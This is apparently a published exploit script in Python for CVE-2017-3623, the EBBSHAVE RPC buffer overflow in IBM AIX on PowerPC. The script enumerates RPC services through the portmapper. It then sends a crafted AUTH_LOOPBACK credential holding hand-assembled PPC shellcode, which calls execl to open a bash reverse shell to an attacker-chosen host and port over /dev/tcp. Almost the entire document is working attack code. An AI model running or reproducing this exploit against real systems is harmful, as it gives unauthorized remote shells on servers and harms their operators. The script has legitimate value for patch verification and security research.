# Exploit Author: Harrison Neal
# Vendor Homepage: https://www.ibm.com/us-en/
# Version: 6100-09-04-1441, 7100-03-05-1524, 7100-04-00-0000, 7200-01-01-1642
# Tested on: IBM AIX PPC
# CVE: CVE-2017-3623
# EBBISLAND / EBBSHAVE RPC Buffer Overflow for IBM AIX PPC


#!/usr/bin/python
# Usage: ebbshave-aixgeneric-v1.py rhost lhost lport gid_base execl_func execl_toc

# Exploit code example; shellcode requires /usr/bin/bash on the target

# Example values for my AIX 7.2 LPAR:
# gid_base: 3007d390
# execl_func: d0307940
# execl_toc: f081bc20

# CAUTION: If a RPC service repeatedly crashes, it can be automatically disabled

from os import urandom
from socket import socket, AF_INET, SOCK_STREAM
from struct import pack, unpack
from sys import argv, exit
from time import time, sleep

def getCredLoopbackBody():
	global gid_base, rhost, lhost, lport, gid_base, execl_func, execl_toc

	epoch = pack(&#039;>I&#039;, time()) # Make sure the system clock is in sync w/ target

	# Doesn&#039;t matter, ljust call assumes len <= 4
	node_name = &#039;hn&#039;
	node_length = pack(&#039;>I&#039;, len(node_name))
	node_name = node_name.ljust(4, &#039;\x00&#039;)

	# Also doesn&#039;t matter
	uid = pack(&#039;>I&#039;, 0)
	gid = pack(&#039;>I&#039;, 0)

	# Big enough to trigger an overflow
	# Not big enough to trigger defensive code
	# You could make this a little bit less,
	# but you&#039;d have to tweak the part 2 code
	gids_len = pack(&#039;>I&#039;, 64)

	base_addr = pack(&#039;>I&#039;, gid_base)
	addr_8c = pack(&#039;>I&#039;, gid_base + 0x8c)
	addr_a8 = pack(&#039;>I&#039;, gid_base + 0xa8)
	addr_4c = pack(&#039;>I&#039;, gid_base + 0x4c)

	func_addr = pack(&#039;>I&#039;, execl_func)
	toc_addr = pack(&#039;>I&#039;, execl_toc)

	cmd = &#039;bash -i >& /dev/tcp/&#039; + lhost + &#039;/&#039; + lport + &#039; 0>&1&#039;
	cmd = cmd.ljust(0x30, &#039;\x00&#039;)

	# Each GID is 4 bytes long, we want 64
	gids = (
		# +0x0 # filepath
		&#039;/usr/bin/bash\x00\x00\x00&#039;

		# +0x10 # argv[0]
		&#039;bash\x00\x00\x00\x00&#039;

		# +0x18 # argv[1]
		&#039;-c\x00\x00&#039;

		# +0x1c # argv[2]
	) + cmd + (

		# +0x4c # r3 = filepath
		&#039;\x70\x63\x00\x00&#039; # andi. r3, r3, 0x0
		&#039;\x3c\x60&#039;
	) + base_addr[0:2] + ( # lis r3, ...
		&#039;\x60\x63&#039;
	) + base_addr[2:4] + ( # ori r3, r3, ...

		# +0x58 # r4 = argv[0]
		&#039;\x38\x83\x00\x10&#039; # addi r4, r3, 0x10

		# +0x5c # r5 = argv[1]
		&#039;\x38\xa4\x00\x08&#039; # addi r5, r4, 0x8

		# +0x60 # r6 = argv[2]
		&#039;\x38\xc5\x00\x04&#039; # addi r6, r5, 0x4

		# +0x64 # r7 = NULL
		&#039;\x70\xe7\x00\x00&#039; # andi. r7, r7, 0x0

		# +0x68 # r2 = libc.a TOC for execl
		&#039;\x70\x42\x00\x00&#039; # andi. r2, r2, 0x0
		&#039;\x3c\x40&#039;
	) + toc_addr[0:2] + ( # lis r2, ...
		&#039;\x60\x42&#039;
	) + toc_addr[2:4] + ( # ori r2, r2, ...

		# +0x74 # execl
		&#039;\x71\x08\x00\x00&#039; # andi. r8, r8, 0x0
		&#039;\x3d\x00&#039;
	) + func_addr[0:2] + ( # lis r8, ...
		&#039;\x61\x08&#039;
	) + func_addr[2:4] + ( # ori r8, ...
		&#039;\x7d\x09\x03\xa6&#039; # mtctr r8
		&#039;\x4e\x80\x04\x21&#039; # bctrl

		# +0x88 # 0x14 padding
		&#039;AAAAAAAAAAAAAAAAAAAA&#039;

		# +0x9c # Will be NULL
		&#039;ZZZZ&#039;

		# +0xa0
		# @+948: r5 = +0x8c
		# @+968: r5 = *(+0x8c + 0x18) = *(+0xa4)

		# +0xa4
		# @+968: r5 = +0xa8
		# @+972: r0 = *(r5 + 0x0) = *(+0xa8)

		# +0xa8
		# @+972: r0 = +0x4c
		# @+980: ctr = r0 = +0x4c
		# @+988: branch to ctr
	) + addr_8c + addr_a8 + addr_4c + (

		# +0xac # padding
		&#039;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&#039;
	)

	print ":".join("{:02x}".format(ord(c)) for c in gids)
	print len(gids)

	return epoch + node_length + node_name + uid + gid + gids_len + gids

def getCredLoopback():
	cred_flavor = pack(&#039;>I&#039;, 0x55de) # AUTH_LOOPBACK

	cred_body = getCredLoopbackBody()
	cred_len = pack(&#039;>I&#039;, len(cred_body))

	return cred_flavor + cred_len + cred_body

def getAuthNone():
	auth_flavor = pack(&#039;>I&#039;, 0) # AUTH_NONE

	auth_len = pack(&#039;>I&#039;, 0)

	return auth_flavor + auth_len

def getMessage(prog_num, ver_num, proc_num, use_loopback_cred):
	xid = urandom(4)

	mtype = pack(&#039;>I&#039;, 0) # CALL

	rpcvers = pack(&#039;>I&#039;, 2)

	prog = pack(&#039;>I&#039;, prog_num)
	vers = pack(&#039;>I&#039;, ver_num)

	proc = pack(&#039;>I&#039;, proc_num)

	cred = ( getCredLoopback() if use_loopback_cred else getAuthNone() )

	verf = getAuthNone()

	return xid + mtype + rpcvers + prog + vers + proc + cred + verf

def getPacket(message):
	# MSB on = this is the last fragment
	# LSBs = fragment length
	frag = pack(&#039;>I&#039;, len(message) + 0x80000000)

	return frag + message

if len(argv) < 7:
	print &#039;Usage: ebbshave-aixgeneric-v1.py rhost lhost lport gid_base execl_func execl_toc&#039;
	exit(1)

rhost = argv[1]
lhost = argv[2]
lport = argv[3]
gid_base = int(argv[4], 16)
execl_func = int(argv[5], 16)
execl_toc = int(argv[6], 16)

# Query the portmapper for services

services = []

s = socket(AF_INET, SOCK_STREAM)
s.connect((rhost, 111)) # port 111 for portmapper
s.send(getPacket(getMessage(
	100000,	# portmapper
	2,	# version 2
	4,	# DUMP
	False	# unauth request
	)))

s.recv(0x1c) # skip over fragment length, XID, message type, reply state, verifier, accept state

while list(unpack(&#039;>I&#039;, s.recv(4)))[0]: # while next "value follows" field is true
	prog_num, ver_num, proto_num, port = unpack(&#039;>IIII&#039;, s.recv(16))
	if (prog_num == 100024 # status
		and proto_num == 6): # TCP
			print &#039;[ ] Found service &#039; + str(prog_num) + &#039; v&#039; + str(ver_num) + &#039; on TCP port &#039; + str(port)
			services.append((prog_num, ver_num, port))

s.close()

# Try attacking

for service in services:
	prog_num, ver_num, port = service

	serv_str = str(prog_num) + &#039; v&#039; + str(ver_num)

	for attack in [False, True]:
		sleep(1) # be gentle

		print &#039;[ ] &#039; + ( &#039;Attacking&#039; if attack else &#039;Pinging&#039; ) + &#039; &#039; + serv_str

		s = socket(AF_INET, SOCK_STREAM)
		s.connect((rhost, port))

		resp_len = 0

		s.send(getPacket(getMessage(
			prog_num,
			ver_num,
			0,	# NULL, acts like a ping
			attack
			)))

		s.settimeout(5) # give inetd/... a chance to spin up the service if needed

		try:
			resp_len = len( s.recv(1024) ) # try to receive up to 1024 bytes
		except:
			resp_len = 0 # typically either timeout, connection error, or Ctrl+C

		try:
			s.close() # try closing the connection if it isn&#039;t already dead
		except:
			pass # connection is probably already dead

		print &#039;[ ] Got response length &#039; + str(resp_len)

		if resp_len == 0: # suspect the service either timed out or crashed
			if attack:
				print &#039;[+] Probably vulnerable to EBBSHAVE, hopefully you have a shell&#039;
			else:
				print &#039;[-] Service probably down or otherwise misbehaving, skipping...&#039;
				break

